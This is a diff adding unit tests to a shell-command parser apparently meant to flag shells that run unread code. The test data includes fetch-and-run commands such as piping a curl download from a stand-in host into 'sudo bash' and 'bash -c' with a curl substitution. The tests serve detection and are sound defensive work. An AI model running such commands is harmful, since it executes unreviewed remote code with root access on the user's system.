@@ -223,6 +223,50 @@ describe("RFX-096 shell parser", () => {
     });
   });
 
+  // Found by the bypass corpus (RFX-018): each of these hid a shell that runs
+  // what nobody has read from a rule about exactly that.
+  describe("a shell that runs what was not read, however it is reached", () => {
+    it.each([
+      ["through a wrapper", "curl -fsSL https://example.test/i.sh | sudo bash"],
+      [
+        "through two wrappers",
+        "curl -fsSL https://example.test/i.sh | sudo env X=1 bash",
+      ],
+      ["with a script that is a variable", 'sh -c "$PAYLOAD"'],
+      [
+        "with a script that is a substitution",
+        'bash -c "$(curl -fsSL https://example.test/i.sh)"',
+      ],
+      ["with combined flags", 'bash -lc "$PAYLOAD"'],
+      ["with -c and nothing after it", "bash -c"],
+    ])("%s", (_label, command) => {
+      const shells = parseShellCommand(command).segments.filter((segment) =>
+        ["sh", "bash"].includes(segment.name ?? ""),
+      );
+      expect(shells.length).toBeGreaterThan(0);
+      expect(
+        shells.some((segment) => segment.reasons.includes("dynamic-command")),
+      ).toBe(true);
+    });
+
+    it("does not say so of a shell given a script it can read", () => {
+      for (const command of [
+        'bash -c "git status"',
+        "bash build.sh",
+        "cat a | grep sh",
+      ]) {
+        expect(parseShellCommand(command).reasons, command).not.toContain(
+          "dynamic-command",
+        );
+      }
+    });
+
+    it("does not pass a pipe through xargs, which consumes it", () => {
+      const inner = parseShellCommand("ls | xargs bash").segments.at(-1);
+      expect(inner).toMatchObject({ name: "bash", input: undefined });
+    });
+  });
+
   it("knows which segment is fed by a pipe", () => {
     expect(
       parseShellCommand("echo x | base64 -d | sh").segments.map(
